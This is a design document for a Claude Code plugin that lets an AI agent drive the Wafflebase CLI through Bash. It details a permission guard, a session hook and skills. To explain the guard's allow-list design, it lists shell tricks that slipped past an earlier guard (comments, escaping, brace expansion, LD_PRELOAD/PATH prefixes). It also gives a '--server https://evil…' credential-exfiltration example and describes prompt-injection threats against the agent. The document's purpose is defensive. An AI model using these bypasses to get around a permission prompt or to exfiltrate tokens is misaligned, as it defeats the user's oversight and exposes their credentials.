---
title: claude-plugin
target-version: 0.6.13
---

# Claude Code Plugin

## Summary

A Claude Code plugin (`plugins/wafflebase/`, served from this repository's
own marketplace) that lets developers and power users find, read, create,
edit and organize Wafflebase documents from a Claude Code session. It adds
no server and no new API: Claude drives the existing `wafflebase` CLI
through Bash, and the plugin contributes what a bare CLI cannot — skills
that teach the workflows, a permission guard that knows which commands
write, a session hook that reports login state and the web origin, and a
few slash commands.

```
/plugin marketplace add wafflebase/wafflebase
/plugin install wafflebase@wafflebase
```

### Why a CLI-backed plugin, and why first

Three ways to put Wafflebase in front of Claude were weighed:

| Approach | What it costs | What it reaches |
| --- | --- | --- |
| **A. Plugin over the CLI** (chosen) | Packaging, skills, two hooks | Claude Code users |
| B. Local stdio MCP server in the plugin | A new package duplicating the CLI | Claude Code users |
| C. Remote MCP connector | An OAuth 2.1 authorization server (none exists), a hosted MCP server | claude.ai web / Desktop / mobile, and Claude Code |

The first audience is developers and power users, who already run Claude
Code. For them the CLI is the right substrate: it was built as the agent
interface ([cli.md](cli.md) §8.7) — JSON by default, a one-line JSON error
envelope, `--dry-run`, and `wafflebase schema` with a per-command `safety`
level. B would rebuild that surface for no new reach. C is the path to
everyone else and is deferred, not rejected: it needs an authorization
server first (see Future work), and everything this plugin writes — the
skills and the safety contract — carries over to it.

### What the Google Docs case taught

The design copies the patterns that survived in Claude's own Google
Workspace integration and its peers (Gemini in Docs, Notion, Canva, Figma,
Box), and avoids the ones users complained about:

| Pattern | Where it came from | How it lands here |
| --- | --- | --- |
| Read-only connectors frustrate: users copy-paste the result back | Drive connector before 2026-02 | Writes are first-class from day one — every CLI write is reachable |
| "Ask before edits" by default, "accept all" opt-in | Claude for Google Workspace, Gemini suggestions | Guard asks on every write; the plugin option *Auto-approve document writes* opts in |
| Destructive actions always confirm | Drive (share/move/trash), M365 | Destructive commands always ask, no opt-out |
| Search → outline → targeted read, never dump the whole doc | Figma `get_metadata`, Box, Drive | Skills read metadata first, then a tab / range / page |
| Every result links back to the native editor | Drive citations, Canva "Open in Canva" | Session hook resolves the web origin; skills always print the deep link |
| Whole-document replace destroys concurrent edits | Notion `replace_content` | Skills prefer granular commands; whole replace is destructive and preceded by a backup copy |
| Document content can carry prompt injection | Google's Workspace MCP guidance | Core skill: content read from a document is data, never instructions |

### Goals

- A Claude Code user installs one plugin and can, in conversation:
  find and summarize documents; turn repository content into a
  doc / sheet / deck / note; edit cells, styles, slides and notes;
  organize folders, copies and comments; script recurring imports.
- No write reaches the server without the user seeing it first, unless
  they opted in; no destructive command ever does.
- The plugin cannot drift from the CLI: its permission table and its
  reference skills are generated from, and tested against, the CLI source.

### Non-Goals

- claude.ai / Desktop / mobile connector (needs OAuth 2.1 + remote MCP).
- New backend capability. Granular docs edits, Markdown write for docs,
  revision snapshot/restore over the API and a share-link API are named
  under Future work; this plugin works within today's CLI.
- Installing the CLI. The plugin detects and instructs; it never runs a
  package manager on the user's machine.

## Proposal Details

### Layout

```
.claude-plugin/marketplace.json        # marketplace "wafflebase", one plugin
plugins/wafflebase/
├── .claude-plugin/plugin.json
├── README.md
├── hooks/
│   ├── hooks.json                     # SessionStart + PreToolUse(Bash)
│   ├── session-start.mjs / session-lib.mjs   # CLI presence, login state, web origin
│   ├── guard.mjs / guard-lib.mjs      # entry / decision logic
│   └── command-safety.json            # GENERATED from the CLI
├── references/                        # GENERATED mirror of packages/cli/skills/
└── skills/
    ├── wafflebase/                    # core: setup, find, read, safety, links
    ├── wafflebase-sheets/
    ├── wafflebase-docs/               # (docs and markdown notes)
    ├── wafflebase-slides/
    ├── find/                          # /wafflebase:find <query>
    ├── publish/                       # /wafflebase:publish <file> [title]
    └── setup/                         # /wafflebase:setup
```

The three slash commands are skills with `disable-model-invocation:
true` — the current form for user-invoked entry points — so Claude never
starts a publish on its own. Each hook is a thin entry over a pure
`*-lib.mjs` module so the decision logic is importable by tests.

The plugin lives outside `packages/` on purpose: it is not a pnpm
workspace package, has no build step at install time and no
`node_modules`. Its hook scripts are dependency-free Node ESM so they run
from the plugin cache as-is.

### Generated files and the drift guard

Three parts of the plugin restate facts the CLI owns, so all are
generated and a CLI test (`packages/cli/test/plugin.test.ts`) fails when
the committed copy is stale:

1. **`hooks/command-safety.json`** — built by walking the real commander
   tree (`buildProgram()` in `packages/cli/src/cli.ts`), not the registry
   alone, so command aliases (`doc`, `tab`, `image`) are
   classified under every spelling a user can type. Each leaf path is
   joined to its schema entry's `safety` and `variants`. A leaf with no
   schema entry fails the test: an unclassified command is exactly the
   case the guard must never meet.
2. **`references/`** — a byte mirror of `packages/cli/skills/`, which
   stays the single source (the CLI's own agent docs and
   `agentic-office-workflow.md` already point there). A mirror rather than
   per-skill copies, because those files link to each other by relative
   path; the test asserts the directory lists exactly the source's files,
   so a removed CLI skill cannot linger.
3. **`version` in `plugin.json`** — the CLI's version. The plugin ships in
   lockstep with the CLI whose commands it classifies, so a release that
   bumps the CLI regenerates the plugin in the same commit.

Generating the table surfaced one registry gap: `schema` itself had no
entry. It now has one (`read-only`).

`pnpm cli build:plugin` regenerates them; `pnpm cli test` (and so
`verify:fast`) checks them.

Registry `variants` come in two shapes. `"--replace given"` is checkable
on the command line and becomes a flag rule. `"a value is null"` depends
on the payload, which the guard cannot see, so the guard assumes the
variant applies: `sheets column-styles set` is treated as destructive.

### Permission guard (`PreToolUse`, matcher `Bash`)

The guard reads the hook's stdin, and only when the Bash command is a
`wafflebase` invocation does it answer:

| Classified as | Decision | Why |
| --- | --- | --- |
| `read-only`, a *simple* command | no decision — the user's own rules (or `allow` with the *Auto-allow read-only commands* option) | An `allow` trusts that `wafflebase` in the persistent shell is still the real CLI, which the guard cannot check; see below |
| `write` | `ask` (or `allow` with the *Auto-approve document writes* option, for a plain invocation) | "Ask before edits" default, accept-all opt-in |
| `destructive`, a `--replace` variant, or a payload-dependent destructive variant | `ask`, always | Delete / overwrite are not undoable over the API today |
| `read-only` that writes a local file (`export <file>`, `--out <file>`, `files download`; `-` = stdout is exempt) | `ask`, always | The server sees a read, the user's disk sees a write; the opt-in covers Wafflebase edits, not files |
| A write that uploads a local file (`files upload`, `images upload`, `… import <file>`) | `ask`, always | Sending the user's disk to a possibly shared workspace is not a document edit (`~/.ssh/id_rsa` is one prompt injection away) |
| `login`, `logout`, `ctx switch`, `api-keys create`, `templates publish`, `templates use` (`--into` another workspace) | `ask`, always | Credentials, sign-in state or a document's audience — not document content |
| Any command with `--server`, `--api-key`, `--profile` or a `VAR=` prefix | `ask`, always | Chooses where the user's credentials go, or what runs |
| Not classifiable (unknown subcommand, CLI newer than the table) | `ask` | Fail toward the prompt, never toward silence |
| Not a `wafflebase` command | no output | The user's own rules apply unchanged |

"Simple" is strict, because an `allow` skips the user's prompt, and it
is an **allow-list**, not a list of dangerous characters: the whole
command must be one bare `wafflebase` invocation whose unquoted
characters are all in `[A-Za-z0-9_-.,:/=@+%]`, plus single- or
double-quoted strings without `$`, backticks or backslashes. Anything
else — operators, redirects, `#` comments, brace / glob / tilde
expansion, escapes, `VAR=` prefixes, a path to the binary, wrappers —
leaves the command to the user's normal prompt. The first version used a
deny-list and self-review found three ways past it, each auto-allowing a
write: a comment (`docs delete x # --help`, the guard read the `--help`
the shell drops), double-quote escaping (`"\--help"` reaches commander
with its backslash), and brace expansion (`{D,--out=.zshrc}` becomes an
`--out` after the guard looked). An allow-list closes the class rather
than the three instances.

The guard sorts every Bash command into one of two cases, and the line
between them is the whole design:

1. **Exact** — one bare `wafflebase` invocation, no prefix, wrapper,
   path, composition, redirect, substitution or escape, every character
   literal. Only here does the per-command judgement run (a read falls
   to the user's rules or, opted in, is allowed; a write asks unless
   auto-approved; a delete always asks), and only here can anything be
   allowed.
2. **Not exact, and names `wafflebase` anywhere** — asks. Reads
   included, and without enumerating how the shell might hide a call:
   a composition, a wrapper (known or not), a `VAR=` or `export` prefix,
   a leading redirect, a substitution, an inner shell, an interpreter's
   quoted string. When the guard can still classify the call it says
   what the call is; otherwise the prompt says the command is not exact.

**Allowing is opt-in, for reads as well as writes.** Six review passes
narrowed the gaps around an `allow` to one class the guard cannot close:
Claude Code's shell persists, so what a bare `wafflebase` runs is decided
by earlier commands the guard judged one at a time. An `allow` is only as
good as that resolution. So the default gives none: reads fall to the
user's own permission rules (which prompt unless the user allowed them)
and the guard's job is to *ask* — on writes, deletes, local file I/O,
credential changes and anything inexact. *Auto-allow read-only commands*
and *Auto-approve document writes* turn the `allow` on for exact calls,
for users who accept that trade; the shell-state rule below still asks on
the commands that would subvert it.

A command that does not name `wafflebase` falls to the user's own rules
— with one exception, which applies only while an opt-in is on (with
both off the guard grants nothing, so there is no later `allow` to
subvert, and `. ./venv/bin/activate` should not prompt). Claude Code's Bash shell persists between calls,
and the guard sees one command at a time, so an earlier call could
change what a later, *allowed* `wafflebase docs list` actually runs.
Anything that changes that resolution therefore asks, whether or not it
names the CLI: setting (`=` or `+=`, with or without a redirect) or
exporting a variable that steers it (`PATH`,
`NODE_*`, `LD_*`, `DYLD_*`, `WAFFLEBASE_*`, `HOME`, `XDG_CONFIG_HOME`,
`BASH_ENV`, `ENV`; `export`, `declare -x`, `set -a`), `alias` /
`unalias`, a function named `wafflebase`, `hash`, `enable`, `trap`,
`set -o allexport`, `source` / `.`. These are judged on command words — also behind `builtin`,
`command` and inside `eval` / `sh -c` strings — so `find . -name x` and
`export FOO=bar` stay silent.

Two more rules close what a literal name check cannot see. A program the
shell names by expansion (`w=waffle; ${w}base …`, `$TOOL …`) asks: the
guard cannot read what it is. And the plugin's own files — its guard, its
command table, its manifest — decide every later answer, so a Bash
command that names them, the plugin's tree or `~/.claude/plugins` asks,
and the hook also registers on `Edit|Write|MultiEdit|NotebookEdit` to ask
before any edit whose real path (symlinks resolved, also for a file not
created yet) lies inside the plugin root. The name is also matched
case-insensitively (APFS and NTFS resolve `Wafflebase` to the same file)
and after the shell would join it from quoted pieces (`waffle"base"`).
What remains is state the guard cannot see at all — a profile file read
by a new shell, a `cd` into a directory a relative PATH entry trusts; the
latter is the same reason the session hook ignores relative entries.

**Why this shape.** The first versions promised "writes always ask" and
enumerated the ways a shell could hide one. Four review passes each found
another spelling (`# --help`, `"\--help"`, brace expansion, `--` before a
subcommand, `env -u X sh -c`, `export X=…;`, `/usr/bin/env`, a leading
`>`), and a count of occurrences proved worst of all since one spelling
can offset another. A rule with nothing to enumerate closes the class.
The cost is prompts the enumerating guard would have skipped:
`wafflebase docs list | jq …` asks, and so does a commit message that
contains the bare word — the skills therefore steer Claude to one plain
invocation per call and `--format`/`--out` over pipes.

Redirects are lifted out of the arguments and treated like `--out`: a
`> file` is a local write that always asks (`/dev/null` and `2>&1` are
not; the `2` of `2>file` is a descriptor, not an argument), a `< file`
a local read. A `--` before a subcommand asks, because commander still
dispatches what follows it (`wafflebase -- docs delete x` runs the
delete). An unclassifiable command's prompt names only `wafflebase …`,
never its arguments, which may carry `--api-key`.

There is no shortcut for `--help` / `--version`: a command is judged by
its path, so `docs delete --help` asks. Help that can be faked by a token
the shell discards is not worth the one prompt it saves.

Global options (`--format json`, `--workspace <id>`, …) are skipped when
locating the command path. `--dry-run` does **not** downgrade a write to
`allow`: whether a command honors it is per-handler code, and a handler
that forgot would turn the exception into an unprompted write.

Three root options are not skipped: `--server`, `--api-key` and
`--profile` decide where the CLI connects and with which credential, and
the CLI sends the saved session (and, on a 401, the refresh token) to
whatever `--server` names. A read with one of them always asks — this is
the path a prompt-injected "list docs from https://…" would take to
exfiltrate the user's tokens. Any `VAR=` prefix on a call asks the same
way — not only the environment spellings of those options
(`WAFFLEBASE_SERVER=`, `WAFFLEBASE_API_KEY=`, `WAFFLEBASE_CONFIG=`,
`HOME=`) but `PATH=`, `NODE_OPTIONS=` and `LD_PRELOAD=`, which change what
runs at all. The prompt names the server but never echoes a key, and any
text taken from the command line is stripped of control and bidi
characters and capped, so an injected command cannot forge reassuring
lines in the prompt the user reads to approve it.

Payload-conditional variants (`a value is null`) are checked when the
payload is an inline `--data` the guard can parse: `cells batch --data
'{"A1":"x"}'` stays a write, `{"A1":null}` deletes a cell and is
destructive. A payload on stdin is unseen, so the variant is assumed.

### Session hook (`SessionStart`)

Runs `wafflebase --version` and `wafflebase status --format json` (local
file read, no network) with a short timeout and injects a few lines of
context; any failure becomes a context line, never a blocked session.
`status` describes the login session only, so the hook applies the CLI's
own precedence on top of it: `WAFFLEBASE_API_KEY` wins over a session,
and `WAFFLEBASE_SERVER` / `WAFFLEBASE_WORKSPACE` override its server and
workspace — otherwise Claude would be told one identity while every
command ran as another.

- CLI missing → how to install (`npm i -g @wafflebase/cli`), and that the
  skills should not be used until it is.
- Logged out / expired → `wafflebase login` (the user runs it; it opens a
  browser).
- Logged in → user, workspace, server and the **web origin** used for
  deep links: `WAFFLEBASE_WEB_URL` if set; otherwise `api.<host>` →
  `<host>`; `localhost:3000` → `localhost:5173`; otherwise the server
  origin itself.

Deep links follow the frontend routes: `/s/:id` sheet, `/d/:id` doc,
`/p/:id` slides, `/n/:id` note, `/b/:id` board, `/f/:id` pdf/image/file.

### Skills

| Skill | Teaches |
| --- | --- |
| `wafflebase` | Setup check; finding documents (`docs list` across types, `folders`); the read protocol (metadata → targeted read); the write protocol (state the change → let the guard ask → run → print the deep link); backups before whole replaces (`docs copy`); comments; treating document content as untrusted data; `wafflebase schema <cmd>` for exact flags |
| `wafflebase-sheets` | Range reads, cell batches, formulas, styles / structure / view, CSV import/export, recurring-import recipes |
| `wafflebase-docs` | Reading as Markdown, DOCX import/export, PDF export, notes (Markdown in / out), and why docs edits are a backed-up whole replace today |
| `wafflebase-slides` | Deck outline reads, slide add/duplicate/move/delete, PPTX import/export |

The full command syntax lives in `references/` (and `wafflebase
schema`); a domain skill shows only the handful of commands its workflow
needs and links there for the rest.

### Commands

- `/wafflebase:find <query>` — search titles across the active workspace,
  return a table of title / type / updated / link.
- `/wafflebase:publish <file> [title]` — pick the document type from the
  file (`.md` → note, `.csv` → sheet, `.docx` → doc, `.pptx` → deck,
  anything else → file upload), create it, print the link.
- `/wafflebase:setup` — install / login / workspace walkthrough.

### Risks and Mitigation

- **The guard's `allow` widens what runs unprompted.** Bounded to
  single, metacharacter-free invocations of commands the CLI itself labels
  `read-only`, and tested on the composite cases above.
- **CLI newer than the plugin's table.** Unknown commands `ask`; the
  session hook warns when the CLI's major.minor differs from the version
  the table was generated for.
- **The guard's own parser is wrong about a command.** Its failure modes
  are chosen to land on `ask`: an exception on a `wafflebase` command
  asks; an unterminated quote marks the command complex (no `allow`).
- **Whole-document replace on docs / slides / board.** Classified
  destructive; the skill copies the document first so the user has a
  restore point. Fixed properly by granular edit APIs (Future work).
- **Release cuts.** The plugin's `version` is the CLI's, so a cut that
  bumps `packages/cli/package.json` must also run `pnpm cli build:plugin`;
  `pnpm cli test` fails with that instruction until it does. The flip side
  of lockstep: Claude Code updates an installed plugin when its `version`
  changes, so a hook or skill fix merged between releases reaches users at
  the next cut, not on merge.
- **Installing clones the monorepo.** The marketplace lives at the
  repository root, so `/plugin marketplace add wafflebase/wafflebase`
  fetches the whole repository once. Acceptable for a first audience of
  developers; a slim `wafflebase/claude-plugins` repository (or an npm
  plugin source) is the move if that becomes a complaint.
- **Windows.** `npm i -g` installs a `wafflebase.cmd` shim, which Node
  only runs through cmd.exe — and cmd.exe resolves a bare name from the
  current directory before PATH, so a cloned repository shipping its own
  `wafflebase.cmd` would have run at session start. A relative PATH entry
  (`.`, an empty `::`) does the same on POSIX. The hook therefore walks
  PATH itself on every platform — absolute entries only — and spawns the
  CLI by absolute path; not finding it means "not installed".
- **Credential exfiltration through `--server`.** Self-review found the
  first guard auto-allowing `wafflebase --server https://evil… docs list`,
  which sends the session JWT — and on a 401 the refresh token — to that
  host, then stores whatever tokens it returns. The guard now asks on any
  connection option. The CLI itself should also refuse to send a session
  to a server other than the one that issued it; that is a CLI change
  tracked under Future work, since it protects users without the plugin
  too.
- **Local-file exfiltration through uploads.** Uploads ask even under
  auto-approve, for the same reason.
- **The auto-approve switch is an environment variable.** Claude Code
  hands `userConfig` to hooks as `CLAUDE_PLUGIN_OPTION_AUTO_APPROVE_WRITES`
  (a shell-form hook cannot take `${user_config.*}`), so anything that
  sets the Claude Code process's environment — a sourced `.env`, an
  approved `direnv` — can switch it on. It widens only document edits;
  every "always ask" row above still asks.
- **Prompt injection via the session context.** Workspace names and
  usernames are free text other people choose, and SessionStart context
  outranks document text. The hook strips control and bidi characters,
  caps the length and JSON-quotes every such value.
- **Prompt injection via document content.** Core skill instruction, plus
  the guard: an injected "delete everything" still meets an `ask`.

## Future work

1. **Granular docs/slides edits** — block-anchored replace / insert over
   `/api/v1` so edits stop being whole replaces.
2. **Markdown write for docs** (`docs import foo.md`).
3. **Revision API** — snapshot before an agent edit, restore after; turns
   the backup-copy convention into one-click undo.
4. **Share-link API** for "share this with …".
5. **CLI: bind a session to its server** — refuse (or drop credentials)
   when `--server` / `WAFFLEBASE_SERVER` differs from `session.server`,
   so no caller can redirect a saved session elsewhere.
6. **Remote MCP connector** for claude.ai / Desktop / mobile: an OAuth 2.1
   authorization server on the backend plus a hosted MCP server whose
   tools carry `readOnlyHint` / `destructiveHint` from the same schema
   `safety` the guard uses today.
